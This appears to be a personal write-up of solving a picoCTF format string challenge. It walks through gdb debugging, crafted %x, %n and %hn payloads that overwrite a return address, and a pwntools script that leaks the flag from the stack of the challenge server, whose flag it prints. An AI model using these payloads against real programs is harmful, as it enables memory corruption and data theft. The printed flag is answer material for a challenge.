I first read up on printf vulnerabilities 
(https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf)
and learned specifically:
%s takes the next element from the stack, treats it as an address, and print the string found at that address
%x advances the stack pointer
%n takes the next element from the stack, treats it as an address, and writes the number of characters printed so far to that address

So the basic exploit seems to be:
find the target address of function we want to run
find the location storing the return address of vuln
first part of input is a byte sequence of the address we will overwrite (where return address is stored)
use %x to move the stack pointer to just before our printf data is stored (so that the next item on the stack is the address we will write to)
then print enough characters such that the total number printed = target address
finally use a %n to write that target address value to the return address location

I used gdb to figure these things out:
target address: 0x080492b6
on a normal case run
	vuln eip = 0x80493bd
	saved eip = 0x8049418 (this is the value of address that vuln returns to)
	address 0xffffb6fc stores that return address value
I used an input of aaaabbbbccccddddeeeeffffgggg
to determine:
	input gets stored starting at 0xffffb630
I then used (gdb) run < <(echo -ne "\xef\xbe\xad\xde")
to ensure that I was able to send a byte string to the correct place.
next I used the byte string (gdb) run < <(echo -ne "\xfc\xb6\xff\xff")
to put the address to overwrite at the first position of the input storage region

I just noticed that the value at address 0xffffb624 was 0xffffb630, the first
address of the stored input. So am guessing (based on the diagram in the pdf) that I will need 4 %x and one %n
So now it's just a matter of inputting 0x080492b6 characters before the %n, but I'm not sure if it will even let me do this)
Just a bit more playing around for familiarity:
run < <(echo -ne "aaaa%x%x%x%x") prints out aaaaffffb630ffffb650804934661616161
where the last 4 bytes are exactly from the aaaa pulled off the stack

To make sure I was overwritting the right location, I then tried
run < <(echo -ne "\xfc\xb6\xff\xff%x%x%x%n")

I then tried
run < <(echo -ne "\xfc\xb6\xff\xff%x%x%x%134517430x%n")
which took a while of printing out that massive number of characters
and I think (based on the previous experimentation, that only 3 %x should be used,
and the third one should print as many digits as target_addr - 12, since we will have already printed 12 by that time
so
run < <(echo -ne "\xfc\xb6\xff\xff%x%x%134517424x%n")
I tried
(echo -ne  "\xfc\xb6\xff\xff%x%x%134517424x%n"; cat) | nc -vv saturn.picoctf.net 54651
but the webshell didn't like me doing it; it is just way to many characters.

So then I continued research and discovered this: 
https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
Specifically, the idea of writing the higher order 4 bits of the target address
to the overwrite address first, then the lower order 4 bits; since this way we 
won't have to print as many characters. 
This means using %10$hn to write to the higher order 2 bytes
and %11$hn to write to the lower order 2 bytes
We also have to now start our input with 8 bytes, the first 4 for the address 
of the higher two bytes of the overwrite address, and the next 4 for the address
of the lower two bytes of the overwrite address.

So the input will begin with "\xfe\xb6\xff\xff\xfc\xb6\xff\xff" (note: it is the same 4 bytes repeated, except the first byte which is increased by 2)

Just as a test, I ran
	run < <(echo -ne "\xfe\xb6\xff\xff\xfc\xb6\xff\xff%10$hn%11$hn")
The result was not what I was expecting, so maybe something was wrong. I also 
tried removing the 10$ and 11$, but no matter what, it just kept overwriting the wrong memory address
(edit: later I realized that this was because in that most recent command, I forgot to include the three %x )

Then, I realized that the higher order 2 bytes of the target address (0x0804) 
was already in the overwrite address, so I only needed to change the lower order
2 bytes; writing 0x92b6 = 37558 to that location.
run < <(echo -ne "\xfc\xb6\xff\xff%x%x%x%hn")
That command let me change just the lower order bytes of the overwrite location. Perfect!
Now I just need to add padd the third %x with 37558 - 4 - 8 - 8 = 37538
So I ran
	run < <(echo -ne "\xfc\xb6\xff\xff%x%x%37538x%hn")
Which returned to readflag() after vuln, as desired.

The only problem is that readflag takes a couple arguments; and does not 
print the flag by itself. Vuln creates a buffer the same size as the flag,
so I know I need to pass that as one of the arguments, and I think pass 64 as the other,
and then somehow print the contents of that buffer.
I think this may have just escalated in complexity, but I'm wondering if maybe
I'm supossed to replace the call to putchar, or even somehow dynamically add
code to the readflag, so that it also prints it.

Another possibility would be to reroute readflag()'s return to go to the beginning
of vuln(), so that we would have another printf exploit available, and print the flag buffer in that one.
I've been trying this for the past 6 hours, so I'll take a break and come back later.

-----------------------------------------
Back again a week later
-----------------------------------
I think the ideas in https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/binary-exploitation
will be useful; especially in the rop chain challenge section. My guess is that I can return from vuln to readflag, and also set the base pointer to vuln entrance again, so that I can keep exploiting the printfs and print the buffer.

The address of vuln is 0x08049333, which is conviniently not to far after readflag address.
After running that last gdb statement again, I noticed that after vuln returns to readflag,
readflag tries to return to 0x00000001 but get seg fault. 
The 0x00000001 is stored in memory 0xffffb700 (immediately after the 4 bytes of readflag target address that we put in the return address space.
Knowing what I now do about the stack, this makes sense, since that is the base pointer (I think) which is the return address 
for the function we are returning to. So I just need to set that location to store
0x08049333, set the following 4 bytes to the buffer pointer, and the following 4 to a number >= 64.
If this works, readflag will return to start of vuln, flag will be in buffer, and I will just need 
to use a %s in the input to print it.

run < <(echo -ne "\xfc\xb6\xff\xff\x02\xb7\xff\xff%x%x%37534x%hn%n")
This writes target address into its spot, and also edits the higher order 2 bytes of the base pointer spot.
I realize I'll have to switch things around a little since we need to write 0x0804 into those 
higher order two bytes first, then continue printing chars to get to 0x92b6 and %hn that into
low order 2 bytes of return address spot, then add more chars to get to 0x9333 and put that in low order 2 bytes of base pointer spot.
For convinience in printing specified number of chars, I'll but a padding word onto the stack in
between each mem address that I want to write to, so that I can %x to take that padding off
and print a certain number of chars.
I might have to worry about sending arguments as well, but I'll worry about that next.

So run < <(echo -ne "\x02\xb7\xff\xff\aaaa\xfc\xb6\xff\xffaaaa\xfe\xb6\xff\xff\%8x%8x%2015x%hn%3556x%hn%125x%hn")
36 chars before third %x, so 0x804 = 2052 and 2052-36-1 = 2015
then 0x92b6 - 0x804 = 35536
and 0x9333 - 0x92b6 = 125
That input was causing a weird segmentation fault, so I went into disass vuln to add another
break point and noticed that vuln calls readflag...VULN CALLS READFLAG!!!!!!!!
How was I so blind to miss that? This whole time I've been preparing to do an exploit call of
readflag, and the readflag statement in vuln was just sitting there in front of me. Yikes!
I guess it's time to restart and complete the (somewhat easier) actual challenge.

It's now just a matter of finding the address of where the flag buffer starts, and using %s
to print from it. After setting a breakpoint just after the scanf call in vuln,
I see with "info frame" that Locals at 0xffffb61c. The first local holds 0x08049385; neither that
nor the second looks like a good place in memory. So I breakpointed just after readflag returned.
Now the second local is 0xffffb6b0.
Looking at that area with (gdb) x/100x 0xffffb6b0, I notice that the first word contains 0x6f636970, which 
is hex for pico (which is the contents of my debugging flag.txt), so this is it.

It's just a matter of sticking that address into the first word of story buffer, popping off
the top three stack items to get the pointer to that word, and using %s to print the string
found at that address. Here it goes...
(gdb) run < <(echo -ne "\xb0\xb6\xff\xff%x%x%x%s")
Works! 

(echo -ne  "\xb0\xb6\xff\xff%x%x%x%s"; cat) | nc -vv saturn.picoctf.net 52932
This did not work...strange.

I tried python
> from pwn import *
> r = remote("saturn.picoctf.net", 52932)
> r.sendlineafter("Tell me a story and then I'll tell you one >> ", p32(0xffffb6b0) + "%x%x%x%s".encode('utf-8'))
> r.recv()

but that didn't work either. Strangely, nothing was showing up from the %x commands.
So I tried the same thing, but with just a 9 %x statements and no %s, and got
b"Here's a story - \n\xb0\xb6\xff\xffffe1d5a0ffe1d5c08049346ffffb6b078257825782578257825782578257825ff007825\n"
so it looks like I need 4.
Actually, I think the problem is that the stack is different on the remote server. So I have to
find a way to figure out the address of the flag buffer pointer.

I noticed in gdb local, that inputting just %x outputs ffffb630, which is the pointer to the start of story buffer,
and that ffffb6b0 (the flag buff pointer) is 128 (64 bytes) more, as expected.

I have another idea. Since the top stack item is the pointer to the story buffer, if I can
enter enough characters to fill the memory from the start of the story buffer to the start of 
the flag buffer, then putting a %s at the beginning should print the entire contiguous block of text. 
No matter how many chars I put in, however, a null character gets put at the 128 place and no more get saved, which must just 
be part of how scanf works (since the code has specified the number of bytes to read), so the exploit must be in the printf

I think I finally realized how to do it... If I just put enough %x in, it will end up printing the words that make up the flag.
r.sendlineafter("Tell me a story and then I'll tell you one >> ", "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x".encode('utf-8'))
and the output:
b"Here's a story - \nffc23b40ffc23b608049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578252578256f6369707b4654436b34334c5f676e3167346c466666305f3474535f365f6b63336165617d633763fbad2000bcb547000f7f3a990804c00080494100804c000ffc23c2880494182ffc23cd4ffc23ce00ffc23c4000f7d30ee5\n"

Sure enough, the output string contains 6f636970 (hex ocip due to the endieness). I noticed that
there is the word "bad" in there too, so I copied the hex starting with the 6f and ending just before bad,
and it translates to
ocip{FTCk43L_gn1g4lFff0_4tS_6_kc3aea}c7c

so I just need to run the python
> flag = ""
> s = "ocip{FTCk43L_gn1g4lFff0_4tS_6_kc3aea}c7c"
> for i in range(0, len(s), 4):
	flag += s[i+3] + s[i+2] + s[i+1] + s[i]
> print(flag)
picoCTF{L34k1ng_Fl4g_0ff_St4ck_6aea3c7c}

Phew; it feels so good to be done that one.
